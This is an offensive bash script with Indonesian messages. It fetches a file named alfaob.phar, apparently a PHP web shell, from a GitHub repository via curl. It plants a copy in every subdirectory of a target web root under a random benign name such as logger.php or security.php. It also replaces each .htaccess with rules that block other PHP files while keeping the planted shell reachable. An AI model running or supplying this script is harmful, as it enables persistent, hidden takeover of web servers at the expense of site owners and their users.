#!/bin/bash

if [ -z "$1" ]; then
  echo "Penggunaan: bash ht.sh /path/to/directory"
  exit 1
fi

TARGET_DIR="$1"
if [ ! -d "$TARGET_DIR" ]; then
  echo "Direktori $TARGET_DIR tidak ditemukan atau bukan direktori."
  exit 1
fi

PHP_URL="https://raw.githubusercontent.com/paylar/shell/refs/heads/main/alfaob.phar"

PHP_FILES=(
  "autoload.php" "constants.php" "settings.php" "middleware.php" "dispatcher.php" 
  "response.php" "request.php" "router-config.php" "bootstrap.php" "model.php" 
  "view.php" "template.php" "cache.php" "logger.php" "error-handler.php" 
  "validator.php" "security.php" "firewall.php" "backup.php" "db-migrate.php" 
  "migration.php" "seed.php" "database-seeder.php" "queue-worker.php" "mail-handler.php" 
  "notification.php" "message-broker.php" "event-listener.php" "event-dispatcher.php" "command-runner.php" 
  "worker.php" "job-handler.php" "scheduler.php" "task-runner.php" "queue.php" 
  "file-uploader.php" "image-processor.php" "image-resizer.php" "pdf-generator.php" "report-generator.php" 
  "payment-handler.php" "checkout.php" "cart-manager.php" "order-manager.php" "invoice.php" 
  "customer-service.php" "support.php" "ticket-system.php" "user-profile1.php" "account-settings.php"
)

if ! command -v curl &> /dev/null; then
    echo "curl tidak ditemukan, silakan install curl terlebih dahulu."
    exit 1
fi

find "$TARGET_DIR" -type f -name ".htaccess" -exec rm -f {} +

TMP_PHAR=$(mktemp)
curl -s -o "$TMP_PHAR" "$PHP_URL"
if [ $? -ne 0 ] || [ ! -f "$TMP_PHAR" ]; then
    echo "Gagal mendownload file alfaob.phar"
    exit 1
fi

HTACCESS_CONTENT="<Files *.ph*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.a*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.Ph*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.S*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.pH*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.PH*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.s*>
    Order Deny,Allow
    Deny from all
</Files>

<FilesMatch \"\.(jpg|pdf|docx|jpeg|)$\">
    Order Deny,Allow
    Allow from all
</FilesMatch>

<FilesMatch \"^(index.html|index-MAR.php|@PHPFILE@)$\">
    Order allow,deny
    Allow from all
</FilesMatch>

DirectoryIndex index.html
Options -Indexes
ErrorDocument 403 \"403 Forbidden\"
ErrorDocument 404 \"403 Forbidden\""

TMP_HTACCESS=$(mktemp)
echo "$HTACCESS_CONTENT" > "$TMP_HTACCESS"

export TMP_PHAR
export TMP_HTACCESS
export -f

PHP_FILES_STR="${PHP_FILES[*]}"
export PHP_FILES_STR

random_file() {
    local arr=($PHP_FILES_STR)
    echo "${arr[$RANDOM % ${#arr[@]}]}"
}

do_work() {
    DIR="$1"
    SELECTED_PHP_FILE=$(random_file)
    cp "$TMP_PHAR" "$DIR/$SELECTED_PHP_FILE"
    if [ $? -ne 0 ] || [ ! -f "$DIR/$SELECTED_PHP_FILE" ]; then
        echo "Gagal menyalin $SELECTED_PHP_FILE ke $DIR"
        return
    fi
    chmod 644 "$DIR/$SELECTED_PHP_FILE"
    cp "$TMP_HTACCESS" "$DIR/.htaccess"
    if [ $? -ne 0 ] || [ ! -f "$DIR/.htaccess" ]; then
        echo "Gagal menyalin .htaccess ke $DIR"
        return
    fi
    sed -i "s/@PHPFILE@/$SELECTED_PHP_FILE/g" "$DIR/.htaccess"
}

export -f do_work random_file

find "$TARGET_DIR" -type d -print0 | xargs -0 -I{} -P 5 bash -c 'do_work "$@"' _ {}
rm -f "$TMP_PHAR" "$TMP_HTACCESS"
